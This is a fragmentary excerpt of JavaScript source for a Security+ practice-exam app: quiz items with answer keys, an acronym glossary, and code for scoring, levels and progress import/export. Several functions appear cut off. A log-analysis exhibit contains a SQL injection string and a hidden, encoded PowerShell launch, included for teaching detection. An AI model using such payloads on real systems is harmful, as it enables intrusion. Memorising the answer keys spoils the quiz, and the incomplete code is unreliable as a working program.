explain:"Defense in depth: internet-facing services go in the screened subnet, users on the LAN, and crown-jewel data and identity systems in the most restricted zone with tight ACLs."});

P({id:"pbq-logs",obj:"4.9",type:"table",title:"Log analysis",
prompt:"Review each log excerpt and identify the MOST likely activity.",
exhibit:"[A] fw: DENY 203.0.113.9:51122 -> 10.0.5.10:21, :22, :23, :25, :53, :80 ... :1024 (1,022 events in 40s)\n[B] auth: 04:12:01 user=jsmith result=SUCCESS src=NY,US | 04:19:44 user=jsmith result=SUCCESS src=Lagos,NG\n[C] web: 198.51.100.7 \"GET /item.php?id=10%20OR%201=1--\" 200\n[D] edr: WINWORD.EXE spawned powershell.exe -nop -w hidden -enc SQBFAFgA...\n[E] dlp: 4.2 GB uploaded by host FIN-PC22 to mega-like-file-share.example at 02:30\n[F] auth: 3,400 failed logins for user=admin from 192.0.2.44 in 10 minutes",
cols:["Activity"],
rows:[
{label:"Log A",cells:[{opts:["Port scan","DDoS","Data exfiltration","Brute force"],ans:0}]},
{label:"Log B",cells:[{opts:["Impossible travel (compromised account)","Port scan","SQL injection","Normal VPN use"],ans:0}]},
{label:"Log C",cells:[{opts:["SQL injection","Directory traversal","XSS","CSRF"],ans:0}]},
{label:"Log D",cells:[{opts:["Malicious macro launching encoded PowerShell","Normal Office update","Port scan","Password spraying"],ans:0}]},
{label:"Log E",cells:[{opts:["Possible data exfiltration","Port scan","Brute force","DNS poisoning"],ans:0}]},
{label:"Log F",cells:[{opts:["Brute force against one account","Password spraying","Impossible travel","Replay attack"],ans:0}]}],
explain:"A: one source hitting sequential ports = port scan. B: logins from NY and Lagos 7 minutes apart = impossible travel. C: OR 1=1-- = SQL injection. D: Word spawning hidden, encoded PowerShell = malicious macro/fileless malware. E: large off-hours upload to file sharing = exfiltration. F: many attempts against one account = brute force (spraying would be few attempts against many accounts)."});

P({id:"pbq-risk-calc",obj:"5.2",type:"table",title:"Quantitative risk analysis",
prompt:"A warehouse inventory system is valued at $400,000. A fire would destroy 25% of its value. Fires are expected once every 20 years. Calculate each value.",
exhibit:"AV = $400,000   EF = 25%   Occurrence = 1 in 20 years",
cols:["Value"],
rows:[
{label:"Single loss expectancy (SLE)",cells:[{opts:["$100,000","$400,000","$25,000","$5,000"],ans:0}]},
{label:"Annualized rate of occurrence (ARO)",cells:[{opts:["0.05","20","0.25","0.5"],ans:0}]},
{label:"Annualized loss expectancy (ALE)",cells:[{opts:["$5,000","$100,000","$20,000","$2,000,000"],ans:0}]},
{label:"Max justified annual spend on a fire control (cost-effective)",cells:[{opts:["Up to about $5,000 per year","Up to $400,000 per year","Up to $100,000 per year","$0"],ans:0}]}],
explain:"SLE = AV × EF = $400,000 × 0.25 = $100,000. ARO = 1/20 = 0.05. ALE = SLE × ARO = $5,000. A control costing more per year than the ALE it eliminates is generally not cost-justified."});

CCPA|California Consumer Privacy Act|California privacy law giving consumers rights over their data.
CD|Continuous Delivery/Deployment|Automatically releasing tested code.
CEO|Chief Executive Officer|Top executive of an organization.

CIA|Confidentiality, Integrity, and Availability|The core security triad.

/* ---------- utils ---------- */
function $(s,r){return (r||document).querySelector(s)}

function reduced(){return S.settings.motion==="off"||(window.matchMedia&&matchMedia("(prefers-reduced-motion: reduce)").matches)}

/* ---------- data ---------- */
var QB=window.__QB, PB=window.__PB, QMAP={}, PMAP={};

  if(sc&&!sc[g.e]){sc[g.e]=1;if(low.indexOf(g.e.toLowerCase())<0){var before=str.slice(0,off),inP=(before.split("(").length-before.split(")").length)>0;var ex=esc(pl?(GPL[k]||g.e+"s"):g.e);out+=inP?' ['+ex+']':' ('+ex+')'}}return pre+out})}
function acrPop(t){var old=$("#acrpop");if(old)old.remove();var el=document.createElement("div");el.id="acrpop";el.className="acrpop";el.innerHTML='<div class="in"><div class="row" style="justify-content:space-between;align-items:flex-start"><div><b class="mono" style="color:var(--cy);font-size:18px">'+esc(t.getAttribute("data-k"))+'</b><div style="font-weight:700">'+esc(t.getAttribute("data-e"))+'</div></div><button class="iconbtn" data-act="acrClose" aria-label="Close">\u2715</button></div>'+(t.getAttribute("data-d")?'<div class="small muted" style="margin-top:6px">'+esc(t.getAttribute("data-d"))+'</div>':'')+'</div>';document.body.appendChild(el)}

/* ---------- storage ---------- */
var memStore={}, storageOK=true;
try{var tk="__t"+Date.now();localStorage.setItem(tk,"1");localStorage.removeItem(tk)}catch(e){storageOK=false}
function sget(k){try{return storageOK?localStorage.getItem(k):memStore[k]}catch(e){return memStore[k]}}
function sset(k,v){try{if(storageOK)localStorage.setItem(k,v);else memStore[k]=v}catch(e){memStore[k]=v;storageOK=false}}
function fresh(){return {v:1,created:Date.now(),xp:0,streak:{n:0,best:0,last:null},daily:{d:null,n:0},q:{},o:{},badges:{},hist:[],mocks:[],diag:false,combo:0,bestCombo:0,answered:0,correct:0,pbqPerfect:0,session:null,reviews:[],settings:{sound:false,motion:"auto"}}}
var S;
function load(){var raw=sget(KEY);if(raw){try{S=Object.assign(fresh(),JSON.parse(raw));S.settings=Object.assign(fresh().settings,S.settings||{});return}catch(e){}}S=fresh()}
function save(){sset(KEY,JSON.stringify(S))}
load();
try{if(navigator.storage&&navigator.storage.persist)navigator.storage.persist().catch(function(){})}catch(e){}

/* ---------- levels ---------- */
function xpFor(L){return 50*(L-1)*(L+2)}
function levelOf(xp){var L=1;while(xp>=xpFor(L+1))L++;return L}
function rankName(L){return L<=RANKS.length?RANKS[L-1]:"CISO \u2605"+(L-RANKS.length)}

/* ---------- mastery ---------- */
function objM(o){var r=S.o[o];return r?r.m:null}
function updObj(o,res){var r=S.o[o]||{m:0,n:0};var a=r.n<3?1/(r.n+1):0.3;r.m=r.m+(res-r.m)*a;r.n++;S.o[o]=r}
function domStats(d){var objs=Object.keys(OBJ).filter(function(o){return dom(o)===d});var seen=0,sum=0,sumAll=0;objs.forEach(function(o){var m=objM(o);if(m!=null){seen++;sum+=m;sumAll+=m}else sumAll+=0.35});return {m:seen?sum/seen:null,cov:seen/objs.length,seen:seen,total:objs.length,est:sumAll/objs.length}}
function readiness(){var t=0;for(var d=1;d<=5;d++)t+=DOMAINS[d].w*domStats(d).est;return Math.round(100+800*t)}

/* ---------- selection ---------- */
function qWeight(q,now){var s=S.q[q.id],m=objM(q.obj);if(m==null)m=0.5;var base;

 return base*(0.5+2*(1-m))}
function pickQ(n,filter,exclude){var now=Date.now();var c=QB.filter(function(q){return (!filter||filter(q))&&!(exclude&&exclude[q.id])});return wsample(c,c.map(function(q){return qWeight(q,now)}),n)}
function pickP(n,filter){var now=Date.now();var c=PB.filter(function(p){return !filter||filter(p)});return wsample(c,c.map(function(p){return qWeight(p,now)}),n)}
function mkM(q){var perm=shuffle(range(q.opts.length));return {k:"m",id:q.id,perm:perm,sel:[],done:false}}
function mkP(p){var st={};
 if(p.type==="match"){st.place=p.items.map(function(){return null});st.pool=shuffle(range(p.pool.length));st.sel=null}
 else if(p.type==="bins"){st.place=p.items.map(function(){return null});st.order=shuffle(range(p.items.length));st.sel=null}
 else if(p.type==="order"){st.seq=[];st.pool=shuffle(range(p.items.length))}
 else if(p.type==="table"){st.vals=p.rows.map(function(r){return r.cells.map(function(){return null})});st.perms=p.rows.map(function(r){return r.cells.map(function(c){return shuffle(range(c.opts.length))})})}
 return {k:"p",id:p.id,st:st,done:false}}

function newSession(mode,items,extra){var s=Object.assign({flags:{},mode:mode,items:items,idx:0,xp:0,combo:0,maxCombo:0,start:Date.now(),snap:snapshot(),lvl0:levelOf(S.xp),id:Date.now().toString(36)},extra||{});S.session=s;save();go("session")}
function startDiag(){var items=[];for(var d=1;d<=5;d++){var objs=shuffle(Object.keys(OBJ).filter(function(o){return dom(o)===d}));for(var k=0;k<DIAG_MCQ[d];k++){var o=objs[k%objs.length];var got=pickQ(1,function(q){return q.obj===o&&!items.some(function(x){return x.id===q.id})});if(got[0])items.push(mkM(got[0]))}}items=shuffle(items);var ps=pickP(DIAG_PBQ);items.splice(4,0,mkP(ps[0]));items.splice(14,0,mkP(ps[1]));newSession("diag",items,{title:"Placement Test"})}

 if(opts.d){f=function(q){return dom(q.obj)===opts.d};pf=f;title="Domain "+opts.d+" Quiz"}

function startMock(){var items=pickP(MOCK_PBQ).map(mkP);var mq=[];for(var d=1;d<=5;d++)pickQ(MOCK_MCQ[d],function(q){return dom(q.obj)===d}).forEach(function(q){mq.push(mkM(q))});items=items.concat(shuffle(mq));newSession("mock",items,{title:"Mock Exam",endAt:Date.now()+MOCK_MIN*60e3,flags:{}})}

/* ---------- grading ---------- */
function gradeM(it){var q=QMAP[it.id];var a=q.ans.slice().sort().join(),s=it.sel.slice().sort().join();return a===s}
function gradeP(it){var p=PMAP[it.id],st=it.st,ok=0,tot=0;
 if(p.type==="match"){p.items.forEach(function(x,i){tot++;if(st.place[i]!=null&&p.pool[st.place[i]]===x.ans)ok++})}
 else if(p.type==="bins"){p.items.forEach(function(x,i){tot++;if(st.place[i]===x.ans)ok++})}
 else if(p.type==="order"){p.items.forEach(function(x,i){tot++;if(st.seq[i]===i)ok++})}
 else if(p.type==="table"){p.rows.forEach(function(r,ri){r.cells.forEach(function(c,ci){tot++;if(st.vals[ri][ci]===c.ans)ok++})})}
 return {ok:ok,tot:tot,score:tot?ok/tot:0}}
function isAnswered(it){if(it.k==="m")return it.sel.length===QMAP[it.id].ans.length;var p=PMAP[it.id],st=it.st;
 if(p.type==="match"||p.type==="bins")return st.place.every(function(v){return v!=null});
 if(p.type==="order")return st.seq.length===p.items.length;
 return st.vals.every(function(r){return r.every(function(v){return v!=null})})}
function isTouched(it){if(it.k==="m")return it.sel.length>0;var p=PMAP[it.id],st=it.st;if(p.type==="match"||p.type==="bins")return st.place.some(function(v){return v!=null});if(p.type==="order")return st.seq.length>0;return st.vals.some(function(r){return r.some(function(v){return v!=null})})}

function exportJSON(){var o=JSON.parse(JSON.stringify(S));o.session=null;delete o.lastMock;o.exported=Date.now();o.app="secplus701";return JSON.stringify(o)}

  var f=window.File&&navigator.canShare&&navigator.share?new File([blob],name,{type:"application/json"}):null;
  if(f&&navigator.canShare({files:[f]})){navigator.share({files:[f],title:"Security+ progress"}).catch(function(){dl(blob,name)});return}
  dl(blob,name)}catch(e){copyText(data)}}
function dl(blob,name){var u=URL.createObjectURL(blob);var a=document.createElement("a");a.href=u;a.download=name;document.body.appendChild(a);a.click();setTimeout(function(){URL.revokeObjectURL(u);a.remove()},1500);toast("\u2B07","Export ready",name)}

 if(navigator.clipboard&&window.isSecureContext){navigator.clipboard.writeText(t).then(function(){toast("\uD83D\uDCCB","Copied to clipboard","Paste it into Import on your other device.")},fb)}else fb()}

 if(mode==="replace"){if(!confirm("Replace ALL progress on this device with the imported data?"))return;var keep=S.settings;S=Object.assign(fresh(),o);S.session=null;S.settings=Object.assign(fresh().settings,keep)}
 else{Object.keys(o.q).forEach(function(k){var a=S.q[k],b=o.q[k];if(!a||(b.t||0)>(a.t||0))S.q[k]=b});Object.keys(o.o).forEach(function(k){var a=S.o[k],b=o.o[k];if(!a||(b.n||0)>(a.n||0))S.o[k]=b});
  S.xp=Math.max(S.xp,o.xp||0);Object.keys(o.badges||{}).forEach(function(k){if(!S.badges[k])S.badges[k]=o.badges[k]});var ids={};S.hist.forEach(function(h){ids[h.id]=1});(o.hist||[]).forEach(function(h){if(!ids[h.id])S.hist.push(h)});S.hist.sort(function(a,b){return a.date-b.date});
  var md={};S.mocks.forEach(function(m){md[m.date]=1});(o.mocks||[]).forEach(function(m){if(!md[m.date])S.mocks.push(m)});S.reviews=S.reviews||[];var rv={};S.reviews.forEach(function(x){rv[x.id]=1});(o.reviews||[]).forEach(function(x){if(!rv[x.id])S.reviews.push(x)});S.reviews.sort(function(a,b){return a.date-b.date});if(S.reviews.length>60)S.reviews=S.reviews.slice(-60);S.diag=S.diag||!!o.diag;S.bestCombo=Math.max(S.bestCombo,o.bestCombo||0);S.answered=Math.max(S.answered,o.answered||0);S.correct=Math.max(S.correct,o.correct||0);S.pbqPerfect=Math.max(S.pbqPerfect,o.pbqPerfect||0);
  if(o.streak&&(!S.streak.last||(o.streak.last&&o.streak.last>S.streak.last)))S.streak.n=o.streak.n,S.streak.last=o.streak.last;S.streak.best=Math.max(S.streak.best,(o.streak&&o.streak.best)||0)}
 save();toast("\u2705","Progress imported",mode==="replace"?"Replaced this device's data.":"Merged with this device's data.");go("home")}
